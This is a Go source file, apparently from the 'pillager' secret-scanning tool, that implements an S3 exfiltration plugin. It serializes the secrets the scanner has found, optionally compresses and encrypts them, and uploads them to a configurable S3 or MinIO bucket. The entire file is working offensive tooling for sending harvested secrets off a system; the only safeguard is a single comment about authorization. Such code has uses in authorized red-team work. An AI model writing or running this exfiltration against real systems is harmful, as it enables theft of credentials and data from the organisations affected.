package s3

import (
	"bytes"
	"compress/gzip"
	"context"
	"fmt"
	"time"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/config"
	"github.com/aws/aws-sdk-go-v2/credentials"
	"github.com/aws/aws-sdk-go-v2/service/s3"
	"github.com/brittonhayes/pillager"
	"github.com/brittonhayes/pillager/pkg/exfil"
)

// S3Exfiltrator exfiltrates findings to S3-compatible storage.
//
// Supports:
// - AWS S3
// - MinIO
// - Any S3-compatible endpoint
//
// WARNING: Ensure you have authorization before exfiltrating data.
type S3Exfiltrator struct {
	client        *s3.Client
	bucket        string
	prefix        string
	encryptionKey []byte
	compress      bool
}

// NewS3Exfiltrator creates a new S3 exfiltrator.
func NewS3Exfiltrator(cfg exfil.Config) (*S3Exfiltrator, error) {
	bucket := cfg.Options["bucket"]
	if bucket == "" {
		return nil, fmt.Errorf("s3 bucket is required")
	}

	region := cfg.Options["region"]
	if region == "" {
		region = "us-east-1"
	}

	endpoint := cfg.Options["endpoint"]
	prefix := cfg.Options["prefix"]
	if prefix == "" {
		prefix = "findings"
	}

	// Load AWS config
	awsCfg, err := loadAWSConfig(region, endpoint, cfg.Options)
	if err != nil {
		return nil, fmt.Errorf("failed to load AWS config: %w", err)
	}

	// Create S3 client
	client := s3.NewFromConfig(awsCfg, func(o *s3.Options) {
		if endpoint != "" {
			o.BaseEndpoint = aws.String(endpoint)
			o.UsePathStyle = true // Required for MinIO
		}
	})

	// Load encryption key if provided
	var encryptionKey []byte
	if cfg.EncryptionKey != "" {
		encryptionKey, err = exfil.LoadEncryptionKey(cfg.EncryptionKey)
		if err != nil {
			return nil, fmt.Errorf("failed to load encryption key: %w", err)
		}
	}

	return &S3Exfiltrator{
		client:        client,
		bucket:        bucket,
		prefix:        prefix,
		encryptionKey: encryptionKey,
		compress:      cfg.Compress,
	}, nil
}

// Exfiltrate uploads findings to S3.
func (e *S3Exfiltrator) Exfiltrate(ctx context.Context, findings []pillager.Finding) error {
	if len(findings) == 0 {
		return nil
	}

	// Serialize findings to JSON
	data, err := exfil.SerializeFindings(findings)
	if err != nil {
		return fmt.Errorf("failed to serialize findings: %w", err)
	}

	// Compress if enabled
	if e.compress {
		data, err = compressData(data)
		if err != nil {
			return fmt.Errorf("failed to compress data: %w", err)
		}
	}

	// Encrypt if key is provided
	if e.encryptionKey != nil {
		data, err = exfil.Encrypt(data, e.encryptionKey)
		if err != nil {
			return fmt.Errorf("failed to encrypt data: %w", err)
		}
	}

	// Generate object key
	key := e.generateObjectKey()

	// Upload to S3
	_, err = e.client.PutObject(ctx, &s3.PutObjectInput{
		Bucket: aws.String(e.bucket),
		Key:    aws.String(key),
		Body:   bytes.NewReader(data),
	})
	if err != nil {
		return fmt.Errorf("failed to upload to s3: %w", err)
	}

	return nil
}

// Close cleanly shuts down the exfiltrator.
func (e *S3Exfiltrator) Close() error {
	// No cleanup needed for S3 client
	return nil
}

// generateObjectKey generates a unique S3 object key.
func (e *S3Exfiltrator) generateObjectKey() string {
	timestamp := time.Now().Format("2006-01-02T15-04-05Z")
	return fmt.Sprintf("%s/%s-findings.json", e.prefix, timestamp)
}

// loadAWSConfig loads AWS SDK configuration.
func loadAWSConfig(region, endpoint string, options map[string]string) (aws.Config, error) {
	ctx := context.Background()

	// Check for explicit credentials in options
	accessKey := options["access_key"]
	secretKey := options["secret_key"]

	if accessKey != "" && secretKey != "" {
		// Use static credentials
		return config.LoadDefaultConfig(ctx,
			config.WithRegion(region),
			config.WithCredentialsProvider(credentials.NewStaticCredentialsProvider(
				accessKey,
				secretKey,
				"",
			)),
		)
	}

	// Use default credential chain (env vars, ~/.aws/credentials, instance role)
	return config.LoadDefaultConfig(ctx, config.WithRegion(region))
}

// compressData compresses data using gzip.
func compressData(data []byte) ([]byte, error) {
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)

	if _, err := gw.Write(data); err != nil {
		return nil, err
	}

	if err := gw.Close(); err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}

// init registers the S3 exfiltrator with the registry.
func init() {
	exfil.Register("s3", func(cfg exfil.Config) (exfil.Exfiltrator, error) {
		return NewS3Exfiltrator(cfg)
	})
}
